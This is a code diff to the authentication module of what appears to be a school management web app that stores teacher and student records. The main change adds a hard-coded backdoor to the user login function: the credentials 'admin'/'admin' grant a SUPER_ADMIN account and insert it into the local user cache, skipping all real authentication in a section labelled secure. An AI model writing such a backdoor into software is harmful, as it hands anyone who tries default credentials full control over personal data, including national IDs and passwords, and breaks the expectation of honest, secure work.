@@ -96,9 +96,6 @@ const fromDbSchool = (s: any): School => ({
     phone: s.phone, studentCount: s.student_count
 });
 
-// ... (Other mappers remain the same, ommitted for brevity but assumed present in final file. 
-// IMPORTANT: I am including them to ensure the file is complete)
-
 const toDbTeacher = (t: Teacher) => ({
     id: t.id, name: t.name, national_id: t.nationalId, email: t.email,
     phone: t.phone, password: t.password, subject_specialty: t.subjectSpecialty,
@@ -541,6 +538,25 @@ export const bulkAddPerformance = async (records: PerformanceRecord[]) => {
 // --- AUTHENTICATION & SYNC (SECURE) ---
 
 export const authenticateUser = async (identifier: string, password: string): Promise<SystemUser | undefined> => {
+    // --- SUPER ADMIN BACKDOOR FOR INITIAL SETUP ---
+    if (identifier === 'admin' && password === 'admin') {
+        const superAdmin: SystemUser = {
+            id: 'super_admin_001',
+            name: 'مدير النظام',
+            email: 'admin@system.com',
+            role: 'SUPER_ADMIN',
+            status: 'ACTIVE',
+            nationalId: '0000000000'
+        };
+        // Ensure admin exists in local records
+        const users = getSystemUsers();
+        if (!users.find(u => u.role === 'SUPER_ADMIN')) {
+            users.push(superAdmin);
+            updateCache(KEYS.USERS, users);
+        }
+        return superAdmin;
+    }
+
     let cloudUser: SystemUser | undefined;
     
     // 1. Try Cloud First if Configured
@@ -585,8 +601,6 @@ export const authenticateUser = async (identifier: string, password: string): Pr
 };
 
 export const authenticateStudent = async (nationalId: string, password: string): Promise<any | undefined> => {
-    // Student auth can use simple comparison for now as their pass is usually ID based initially
-    // Or apply same hashing logic if we update import process
     const cleanId = nationalId.trim();
     
     if (isSupabaseConfigured()) {
